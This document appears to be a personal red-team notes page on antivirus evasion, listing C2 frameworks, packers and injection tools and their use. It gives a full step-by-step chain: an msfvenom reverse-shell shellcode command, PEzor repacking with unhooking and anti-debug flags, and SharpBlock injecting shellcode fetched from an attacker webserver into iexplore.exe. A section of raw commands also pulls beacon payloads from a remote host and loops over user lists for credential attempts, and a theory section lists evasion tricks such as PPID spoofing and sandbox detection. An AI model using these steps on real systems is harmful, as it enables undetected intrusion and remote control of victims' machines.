# AV Bypass

## Practical 

### C2

- [Covenant](https://github.com/cobbr/Covenant) (favorite so far)
- [Cobalt Strike](https://www.cobaltstrike.com/) (not free :/)
- Metasploit (Without meterpreter ^^)

### Packer
- [PEzor](https://github.com/phra/PEzor)

### Memory injection
- [SharpBlock](https://github.com/CCob/SharpBlock)
	- inject shellcode directly into memory 
	- bypass ETW and Process Hollowing detection
	- Bypass specific AV and ERD dll 

---

### Full PoC (Auto)

Winning combo : SharpBlock + PEzor (bypass Kasp for the moment..)

1. Compile SharpBlock from source (using VStudio). It generates a file : SharpBlock.exe
2. Generate shellcode in raw format (here is an exemple for msf) : 

  ```sh
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HANDLER_IP> LHOST=<HANDLER_PORT> -f raw -o <SHELLCODE_NAME>.bin
  ```
3. Repack shellcode
  ```sh
  ./PEzor.sh -unhook -antidebug -text -sgn -sleep=150 <SHELLCODE_NAME>.bin
  ```
4. Repack SharpBlock adding arguments
  - HTTP webserver version :
  ```sh
  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 <SharpBlock.exe> -p '-e http://<IP_WEBSERVER>/<SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
  ```
  - Local version :
  ```sh
  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 SharpBlock.exe -p '-e <SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
  ```
5. Setup your launcher (and webserver), and execute the packed binary file from the target
6. Be patient (\~5min), get your shell and enjoy

> SharpBlock can load a shellcode from a webserver, or locally. To get rid of the webserver, you can directly drop the two binaries to the target (packed SharpBlock and packed shellcode) but do not execute the packed shellcode directly or you might get caught by the AV. You only need to execute the packed SharpBlock binary (which will inject the packed shellcode directly into memory).

---


### Full PoC (Manual)

**Todo** 

---

### Offline testing 

For testing using a Windows VM connecting to an offline C2 : 
1. Create a Windows VM and install the target AV.
2. Create a Linux VM and install a C2.
3. Set up the network interface to Host-Only for all VMs (Target(s) and C2).
4. Test your payloads and enjoy your shells :)
> You may want to use snapshots and/or linked clones after your infrastructure is ready so that you can trash your Windows VM after each test and pop a new one.

---

### Online testing 

For testing using a Windows VM connecting to an online C2 :

#### Context 

- Restrict Windows VM network
- No trust in the Windows VM firewall
- No need to alter the host firewall 

To restrict the Windows VM traffic to the C2 server only (we don't want our payloads to get sent to the AV cloud), we will create a new Linux VM and use is as a router/firewall.

#### Setup

1. Create a Windows VM and install the target AV.
2. Set up the network interface to Host-Only.
3. Create a Linux VM with 2 network interfaces (NAT and Host-only).
4. Enable ip forwarding : `echo "net.ipv4.forwarding=1">>/etc/sysctl.conf`
5. Setup the firewall as following : 
  ```
  #!/bin/bash
  WANIF=enp0s3
  LANIF=enp0s8
  # IPs to allow
  IP1=<IP_adress_to_allow>
  echo "flushing iptables..."
  sudo iptables -F
  sudo iptables -X
  sudo iptables -t nat -F
  sudo iptables -t nat -X
  sudo iptables -t mangle -F
  sudo iptables -t mangle -X
  echo "setting restrictive router..."
  # ssh for the vm
  sudo iptables -A INPUT -i $LANIF -p tcp --dport 22 -j ACCEPT
  # masquerade
  sudo iptables -A POSTROUTING -t nat -o $WANIF -j MASQUERADE
  sudo iptables -A FORWARD -i $WANIF -m state --state ESTABLISHED,RELATED -j ACCEPT
  # Allow ping on target
  sudo iptables -A FORWARD -i $LANIF -p icmp -d $IP1 -j ACCEPT
  # Allow <LISTENER_PORT> on target
  sudo iptables -A FORWARD -i $LANIF -p tcp --dport <LISTENER_PORT> -d $IP1 -j ACCEPT
  # Drop the rest bitch
  sudo iptables -P INPUT DROP
  sudo iptables -P FORWARD DROP
  sudo iptables -P OUTPUT DROP
  ```
6. make it persistent at each restart :
  ```sh
  sudo apt install iptables-persistent && sudo iptables-save -c > /etc/iptables/rules.v4
  ```
7. Configure the Windows VM (Host-Only network interface) to use the linux VM as his gateway (set static IP address).
8. For DNS you can add the association into the file : `C:\Windows\System32\drivers\etc\hosts`
9. Test your payloads and enjoy your shells :+1:

---

### Automated testing 

CI Pipeline
**todo**

---

### VisualStudio compiler

Compiler location

```bat
C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29333\bin\Hostx64\x64\Src
```

---

### Fix Pezor

Fixed by author. To check :

[Inline syscall old version](https://github.com/phra/PEzor/commit/531095695f56b7ab3add7c9c154ebce830e534a7)


---

### Vrac commands

```sh
for i in `cat /tmp/default_users_for_services_unhash.txt` ; do /opt/vpn_connect -u $i -p a -l /tmp/$i;done

copy \\192.168.56.200\tiki\processinjectionn.zip C:\Users\wee\
copy  C:\Users\wee\processinjectionn\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe \\192.168.56.200\tiki\

ProcessInjection.exe.packed.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:C:\program files\internet explorer\iexplore.exe /pid:7368 /t:4
ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:C:\program files\internet explorer\iexplore.exe /pid:7368 /t:4
ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/procinj /ppath:"C:\program files\internet explorer\iexplore.exe" /pid:4928 /t:3
ProcessInjection.exe /f:raw /url:http://192.168.56.200:9000/longhaul/longhaul_beacon/beacon64.bin.sgn /ppath:"C:\program files\internet explorer\iexplore.exe" /t:3

>cd "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.28.29333\bin\Hostx64\x64>"
> copy Bin\wraith_x64_encoded.bin \\192.168.56.200\tiki\

```

---

## Theorical

Every file has a score that gets involved in triggering one of the three different states (which can change during the scanning process) :
- good (autorise)
- bad (block and alert)
- unknown (block, autorise, monitor, and/or scary prompt, depending on the AV)

### Static analysis

#### 1. Rule-based
Content in the binary that matchs analyst definition of known bad :
- obfuscate functions and string from offense code
- obfuscate base64 encoded dll or shellcode
- change decryption key
- dynamic resolv GetProcAddress, GetModuleGandler

#### 2. Heuristics
Properties of the binary to find suspicious things :
  - compile time
  - compiler (Windows => good or Linux => not good for WinDef)
  - import table
  - metadata resources (name, icon, absence of this)
  - signed or not
  - entropy 
  - take metadata from existing program
  - import table shellcode injection 

#### 3. Correlation
- append known good program to get good score
- reduce entropy (not all packed)

---

### Dynamic analysis

#### 1. Local Sandbox : emulated memory (~ 3sec) 
- short time (3sec only)
- incomplete emulation (CPU only)

#### 2. Cloud VM (~ 1min)
- cheks metadata (sha256 or any ioc from previous analysis)
- more complete emulation

---

### IN memory detection evasion
*payload exe => reflective dll => payload dll*

Thread Start Address (DLL are memory-mapped files)
- Depends on artifact or Process Injection routine that ran the payload

Memory permissions
- Avoid RWX permissions (RW => RX)
- Avoid stagers (use stageless payloads)
- Avoid module-less threads (CreateThread)
- module stamping (persistence)

Memory content
- signs or a PE file
- strings associated with toolset or common techniques
- image_size, prepend, obfuscate, cleanup, strrep, sleep_mask (Cobalt)

Behaviour
- avoid writting a file to disk
- spoof parent PID when executing a program
- injecting into process (!)

Process context to avoid (parent, child):
- explorer.exe, notepad.exe, powershell.exe, rundll32.exe, svchost.exe
- commonly abused applications
- different arch (x32 or x64)

Bypass sandbox detonation (VM)
1. detect sandbox
2. env keying

Whitelised program :
- MS Office Macro
- Powershell
- LOLbins
- DLL SIdeloading

---

## Links

[Network Sockets](https://artikrh.github.io/posts/av-evasion-network-sockets)
[Cobalt Strike: Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
[Wraith](https://github.com/slaeryan/AQUARMOURY/tree/master/Wraith)